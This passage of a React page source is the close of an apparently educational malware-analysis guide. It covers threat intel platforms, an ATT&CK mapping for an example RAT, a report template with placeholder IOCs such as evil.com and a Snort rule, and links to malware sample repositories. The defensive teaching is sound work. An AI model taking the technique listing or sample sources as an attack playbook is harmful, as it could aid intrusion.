              <Grid item xs={12} sm={6} key={idx}>
                <Paper sx={{ p: 2, borderRadius: 2, bgcolor: alpha("#3b82f6", 0.03), border: `1px solid ${alpha("#3b82f6", 0.1)}` }}>
                  <Typography variant="subtitle2" sx={{ fontWeight: 700, color: "#3b82f6" }}>{item.type} Indicators</Typography>
                  <Typography variant="body2" sx={{ fontSize: "0.8rem", mb: 0.5 }}><strong>Examples:</strong> {item.examples}</Typography>
                  <Typography variant="body2" color="text.secondary" sx={{ fontSize: "0.8rem" }}><strong>Usage:</strong> {item.usage}</Typography>
                </Paper>
              </Grid>
            ))}
          </Grid>

          <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#3b82f6" }}>
            Threat Intel Platforms & Standards
          </Typography>

          <Grid container spacing={2} sx={{ mb: 3 }}>
            {[
              { name: "VirusTotal", desc: "Multi-AV scanning, behavioral reports, relationships graph", type: "Platform" },
              { name: "MISP", desc: "Open-source threat intel platform, IOC sharing, correlation", type: "Platform" },
              { name: "OTX (AlienVault)", desc: "Free threat intel community, pulses, IOC feeds", type: "Platform" },
              { name: "STIX/TAXII", desc: "Standards for threat intel format and transport", type: "Standard" },
              { name: "MITRE ATT&CK", desc: "Framework mapping TTPs to known adversary behavior", type: "Framework" },
              { name: "Yara Exchange", desc: "Sharing YARA rules between organizations", type: "Standard" },
            ].map((item, idx) => (
              <Grid item xs={12} sm={6} md={4} key={idx}>
                <Paper sx={{ p: 2, height: "100%", borderRadius: 2, bgcolor: alpha("#3b82f6", 0.03), border: `1px solid ${alpha("#3b82f6", 0.1)}` }}>
                  <Box sx={{ display: "flex", alignItems: "center", gap: 1, mb: 0.5 }}>
                    <Typography variant="subtitle2" sx={{ fontWeight: 700 }}>{item.name}</Typography>
                    <Chip label={item.type} size="small" sx={{ fontSize: "0.6rem" }} />
                  </Box>
                  <Typography variant="body2" color="text.secondary">{item.desc}</Typography>
                </Paper>
              </Grid>
            ))}
          </Grid>

          <Paper sx={{ p: 3, mb: 3, borderRadius: 2, bgcolor: "background.default" }}>
            <Typography variant="body2" component="pre" sx={{ fontFamily: "monospace", fontSize: "0.85rem", overflow: "auto" }}>
{`# MITRE ATT&CK Mapping Example

Malware: Example RAT
Tactics & Techniques:

Initial Access:
  T1566.001 - Spearphishing Attachment (Word doc with macro)

Execution:
  T1059.001 - PowerShell (encoded command execution)
  T1204.002 - User Execution: Malicious File

Persistence:
  T1547.001 - Registry Run Keys
  T1053.005 - Scheduled Task

Defense Evasion:
  T1027 - Obfuscated Files (base64, XOR encoding)
  T1562.001 - Disable Security Tools

Discovery:
  T1082 - System Information Discovery
  T1083 - File and Directory Discovery

Collection:
  T1113 - Screen Capture
  T1056.001 - Keylogging

C2:
  T1071.001 - Web Protocols (HTTPS)
  T1573.002 - Encrypted Channel: Asymmetric Cryptography

Exfiltration:
  T1041 - Exfiltration Over C2 Channel`}
            </Typography>
          </Paper>

          <Alert severity="success" sx={{ borderRadius: 2 }}>
            <AlertTitle sx={{ fontWeight: 700 }}>Building Your Intel Workflow</AlertTitle>
            <Typography variant="body2">
              <strong>1.</strong> Submit samples to VirusTotal, check for existing detections<br />
              <strong>2.</strong> Extract IOCs (hashes, IPs, domains, mutexes)<br />
              <strong>3.</strong> Map to MITRE ATT&CK techniques<br />
              <strong>4.</strong> Search MISP/OTX for related samples and campaigns<br />
              <strong>5.</strong> Create and share YARA rules and STIX bundles
            </Typography>
          </Alert>
        </Paper>

        {/* ==================== SECTION 15: REPORTING ==================== */}
        <Paper
          id="reporting-content"
          sx={{
            p: 4,
            mb: 4,
            borderRadius: 3,
            bgcolor: alpha("#10b981", 0.02),
            border: `1px solid ${alpha("#10b981", 0.1)}`,
            scrollMarginTop: 96,
          }}
        >
          <Box sx={{ display: "flex", alignItems: "center", gap: 2, mb: 3 }}>
            <Box
              sx={{
                width: 56,
                height: 56,
                borderRadius: 2,
                bgcolor: alpha("#10b981", 0.15),
                display: "flex",
                alignItems: "center",
                justifyContent: "center",
                color: "#10b981",
              }}
            >
              <DescriptionIcon sx={{ fontSize: 32 }} />
            </Box>
            <Box>
              <Typography variant="h5" sx={{ fontWeight: 800, color: "#10b981" }}>
                15. Malware Analysis Reporting
              </Typography>
              <Chip label="Complete" size="small" sx={{ mt: 0.5, bgcolor: alpha("#22c55e", 0.15), color: "#22c55e", fontWeight: 600 }} />
            </Box>
          </Box>

          <Typography variant="body1" sx={{ mb: 3, lineHeight: 1.8 }}>
            A good analysis report documents your findings clearly and actionably. Reports serve different 
            audiencesfrom technical SOC analysts who need IOCs to executives who need impact summaries. 
            Learning to write effective reports is as important as the analysis itself.
          </Typography>

          <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#10b981" }}>
            Report Structure Template
          </Typography>

          <Paper sx={{ p: 3, mb: 3, borderRadius: 2, bgcolor: "background.default" }}>
            <Typography variant="body2" component="pre" sx={{ fontFamily: "monospace", fontSize: "0.85rem", overflow: "auto" }}>
{`# Malware Analysis Report Template

## Executive Summary
- Malware name/family (if known)
- One-paragraph summary of capabilities
- Risk level: Critical/High/Medium/Low
- Key recommendation

## Sample Information
- Filename: invoice_march.doc.exe
- File size: 234,567 bytes
- File type: PE32 executable
- MD5: abc123...
- SHA256: def456...
- SHA1: ghi789...
- ssdeep: 384:abc...
- First seen: 2024-01-15
- VirusTotal: 45/70 detections

## Static Analysis Findings
- Compiler/packer information
- Notable strings extracted
- Import analysis (suspicious APIs)
- PE anomalies
- Embedded resources

## Dynamic Analysis Findings
### Execution Summary
- Dropped files
- Registry modifications  
- Network connections
- Process tree

### Persistence Mechanisms
- Run keys: HKCU\\Software\\...
- Scheduled tasks: ...
- Services: ...

### Network Indicators
- C2 servers: 192.168.1.100:443, evil.com
- Protocol: HTTPS with custom headers
- Beaconing interval: 60 seconds

## MITRE ATT&CK Mapping
| Tactic | Technique | ID | Notes |
|--------|-----------|-------|-------|
| Execution | PowerShell | T1059.001 | Base64 encoded |
| Persistence | Registry Run Keys | T1547.001 | CurrentVersion\\Run |

## Indicators of Compromise (IOCs)
### Network
- 192.168.1.100
- evil.com
- https://evil.com/gate.php

### Host
- %TEMP%\\malware.exe
- %APPDATA%\\config.dat
- HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Update

### Hashes
- MD5: abc123...
- SHA256: def456...

## Detection & Mitigation
### YARA Rule
rule DetectMalware { ... }

### Snort/Suricata Rule
alert http any any -> any any (content:"User-Agent: Malware"; sid:1000001;)

### Recommendations
1. Block IOCs at firewall/proxy
2. Scan endpoints for indicators
3. Reset compromised credentials
4. Monitor for lateral movement

## References
- Related samples: VT link, MalwareBazaar
- Previous analysis: Blog posts, other reports

## Analyst Information
- Analyst: Your Name
- Date: 2024-01-20
- Classification: TLP:AMBER`}
            </Typography>
          </Paper>

          <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#10b981" }}>
            Report Best Practices
          </Typography>

          <Grid container spacing={2} sx={{ mb: 3 }}>
            {[
              { tip: "Know Your Audience", desc: "Technical depth varies - SOC needs IOCs, executives need impact", icon: "" },
              { tip: "Be Actionable", desc: "Every finding should have a 'so what' - what can defenders do?", icon: "" },
              { tip: "Include Evidence", desc: "Screenshots, code snippets, PCAPs - prove your conclusions", icon: "" },
              { tip: "Use TLP Markings", desc: "Traffic Light Protocol for appropriate sharing scope", icon: "" },
              { tip: "Version Control", desc: "Track report versions as new information emerges", icon: "" },
              { tip: "Peer Review", desc: "Have another analyst verify findings before publishing", icon: "" },
            ].map((item, idx) => (
              <Grid item xs={12} sm={6} md={4} key={idx}>
                <Paper sx={{ p: 2, height: "100%", borderRadius: 2, bgcolor: alpha("#10b981", 0.03), border: `1px solid ${alpha("#10b981", 0.1)}` }}>
                  <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 0.5 }}>{item.icon} {item.tip}</Typography>
                  <Typography variant="body2" color="text.secondary">{item.desc}</Typography>
                </Paper>
              </Grid>
            ))}
          </Grid>

          <Alert severity="info" sx={{ borderRadius: 2 }}>
            <AlertTitle sx={{ fontWeight: 700 }}>Traffic Light Protocol (TLP)</AlertTitle>
            <Typography variant="body2">
              <strong>TLP:RED:</strong> Personal, for named recipients only<br />
              <strong>TLP:AMBER:</strong> Limited sharing within organization and clients<br />
              <strong>TLP:GREEN:</strong> Community sharing, not for public<br />
              <strong>TLP:WHITE/CLEAR:</strong> Public, no restrictions
            </Typography>
          </Alert>
        </Paper>

        {/* ==================== COMPLETION BANNER ==================== */}
        <Paper
          sx={{
            p: 4,
            mb: 4,
            borderRadius: 4,
            background: `linear-gradient(135deg, ${alpha("#ef4444", 0.15)} 0%, ${alpha("#f97316", 0.1)} 50%, ${alpha("#22c55e", 0.15)} 100%)`,
            border: `2px solid ${alpha("#22c55e", 0.3)}`,
            textAlign: "center",
          }}
        >
          <Typography variant="h4" sx={{ fontWeight: 800, mb: 2 }}>
             Congratulations!
          </Typography>
          <Typography variant="h6" sx={{ mb: 2, color: "text.secondary" }}>
            You've completed the Malware Analysis learning guide!
          </Typography>
          <Typography variant="body1" sx={{ mb: 3, maxWidth: 700, mx: "auto", lineHeight: 1.8 }}>
            You now have a comprehensive foundation in malware analysis, from setting up isolated lab environments 
            and performing static/dynamic analysis, to advanced topics like memory forensics, YARA rules, and 
            threat intelligence. Keep practicing with real samples (safely!) and contributing to the security community.
          </Typography>
          <Box sx={{ display: "flex", justifyContent: "center", gap: 2, flexWrap: "wrap" }}>
            <Chip label="15 Sections Complete" sx={{ bgcolor: alpha("#22c55e", 0.15), color: "#22c55e", fontWeight: 700 }} />
            <Chip label="Static & Dynamic Analysis" sx={{ bgcolor: alpha("#3b82f6", 0.15), color: "#3b82f6", fontWeight: 700 }} />
            <Chip label="Threat Intel Ready" sx={{ bgcolor: alpha("#8b5cf6", 0.15), color: "#8b5cf6", fontWeight: 700 }} />
          </Box>
        </Paper>

        {/* ==================== RESOURCES & NEXT STEPS ==================== */}
        <Paper
          sx={{
            p: 4,
            mb: 4,
            borderRadius: 4,
            background: `linear-gradient(135deg, ${alpha("#10b981", 0.1)} 0%, ${alpha("#22c55e", 0.05)} 100%)`,
            border: `1px solid ${alpha("#10b981", 0.2)}`,
          }}
        >
          <Typography variant="h5" sx={{ fontWeight: 800, mb: 3, color: "#10b981" }}>
             Getting Started Resources
          </Typography>
          
          <Grid container spacing={3}>
            <Grid item xs={12} md={6}>
              <Typography variant="subtitle1" sx={{ fontWeight: 700, mb: 2 }}>
                Free Learning Resources
              </Typography>
              <List dense>
                <ListItem>
                  <ListItemIcon><SchoolIcon sx={{ color: "#10b981" }} /></ListItemIcon>
                  <ListItemText primary="Malware Unicorn RE101/102" secondary="Free malware analysis courses" />
                </ListItem>
                <ListItem>
                  <ListItemIcon><SchoolIcon sx={{ color: "#10b981" }} /></ListItemIcon>
                  <ListItemText primary="SANS Cyber Aces" secondary="Free security fundamentals" />
                </ListItem>
                <ListItem>
                  <ListItemIcon><SchoolIcon sx={{ color: "#10b981" }} /></ListItemIcon>
                  <ListItemText primary="Open Security Training" secondary="Free RE and malware courses" />
                </ListItem>
                <ListItem>
                  <ListItemIcon><SchoolIcon sx={{ color: "#10b981" }} /></ListItemIcon>
                  <ListItemText primary="TCM Security Courses" secondary="Affordable practical training" />
                </ListItem>
              </List>
            </Grid>
            <Grid item xs={12} md={6}>
              <Typography variant="subtitle1" sx={{ fontWeight: 700, mb: 2 }}>
                Sample Sources (Research Only)
              </Typography>
              <List dense>
                <ListItem>
                  <ListItemIcon><BugReportIcon sx={{ color: "#ef4444" }} /></ListItemIcon>
                  <ListItemText primary="MalwareBazaar" secondary="Recent malware samples with context" />
                </ListItem>
                <ListItem>
                  <ListItemIcon><BugReportIcon sx={{ color: "#ef4444" }} /></ListItemIcon>
                  <ListItemText primary="theZoo (GitHub)" secondary="Educational malware repository" />
                </ListItem>
                <ListItem>
                  <ListItemIcon><BugReportIcon sx={{ color: "#ef4444" }} /></ListItemIcon>
                  <ListItemText primary="VirusShare" secondary="Large malware sample repository" />
                </ListItem>
                <ListItem>
                  <ListItemIcon><BugReportIcon sx={{ color: "#ef4444" }} /></ListItemIcon>
                  <ListItemText primary="ANY.RUN Public Submissions" secondary="Analyzed samples with reports" />
                </ListItem>
              </List>
            </Grid>
          </Grid>
        </Paper>

        <QuizSection />

        {/* Back to Hub Button */}
        <Box sx={{ display: "flex", justifyContent: "center", mt: 4 }}>
          <Button
            variant="outlined"
            size="large"
            startIcon={<ArrowBackIcon />}
            onClick={() => navigate("/learn")}
            sx={{ fontWeight: 600 }}
          >
            Back to Learning Hub
          </Button>
        </Box>
        </Box>
      </Box>
    </LearnPageLayout>
  );
}
